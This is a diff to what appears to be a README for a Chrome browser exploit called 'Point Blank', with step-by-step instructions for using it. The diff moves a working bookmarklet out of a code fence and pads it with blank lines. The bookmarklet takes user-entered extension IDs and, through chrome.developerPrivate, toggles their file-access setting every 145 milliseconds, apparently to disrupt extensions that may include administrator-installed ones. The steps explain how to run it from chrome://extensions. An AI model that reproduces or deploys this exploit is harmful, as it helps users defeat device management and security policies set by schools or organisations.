@@ -154,10 +154,21 @@ Point Blank is an exploit that allows you to run bookmarklets on privilaged page
 This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>
 You can either use the prompt or the gui the prompt is below
 1. Bookmark this code:
-```js
-javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
-```
-and <a href="https://extension-installer.glitch.me/old.js">this </a> is the gui
+
+
+
+
+
+
+
+    javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
+    
+    
+    
+    
+    
+   
+And the gui is in launcher.js
 2. Navigate to `chrome://extensions` 
 3. Click on a extension that YOU installed from the Chrome Web Store > Details
 4. In the URL bar, copy the string of letters and numbers after the `/?id=`
